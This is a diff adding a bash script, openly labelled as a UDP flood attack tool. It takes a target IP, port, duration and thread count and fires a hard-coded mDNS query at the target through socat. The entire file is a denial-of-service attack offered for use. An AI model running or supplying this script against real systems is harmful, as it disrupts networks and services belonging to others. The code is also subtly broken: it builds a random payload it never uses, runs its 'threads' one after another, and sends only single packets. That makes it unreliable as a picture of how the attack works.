@@ -1,0 +1,24 @@
+#!/bin/bash
+
+# Check if all arguments are provided
+if [ $# -ne 4 ]; then
+    echo "Usage: $0 ip port time threads"
+    exit 1
+fi
+
+# Extracting arguments
+IP=$1
+PORT=$2
+TIME=$3
+THREADS=$4
+
+# Craft UDP packet with payload
+PAYLOAD=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 32 | head -n 1)
+
+# Perform UDP flood attack
+for ((i=0; i<$THREADS; i++)); do
+    echo -ne "Flood started on $IP:$PORT for $TIME seconds with $THREADS threads\n"
+    timeout $TIME bash -c "echo -n -e '\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x5f\x73\x65\x72\x76\x69\x63\x65\x73\x07\x5f\x64\x6e\x73\x2d\x73\x64\x04\x5f\x75\x64\x70\x05\x6c\x6f\x63\x61\x6c\x00\x00\x0c\x00\x01' | socat - UDP:$IP:$PORT,sourceport=1900"
+done
+
+echo "Attack finished."
